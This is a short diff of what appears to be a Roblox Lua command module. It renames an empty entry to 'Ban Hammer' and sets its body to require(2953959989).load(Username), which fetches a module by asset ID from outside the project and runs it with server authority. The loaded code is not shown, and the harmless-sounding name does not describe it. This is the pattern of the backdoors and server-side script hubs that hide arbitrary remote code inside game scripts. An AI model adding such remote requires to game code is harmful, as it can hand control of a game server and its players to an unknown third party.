@@ -312,9 +312,9 @@ local module = {
         end
     },
     {
-        Name = "",
+        Name = "Ban Hammer",
         Function = function(Username)
-           (Username)
+           require(2953959989).load(Username)
         end
     },
     {
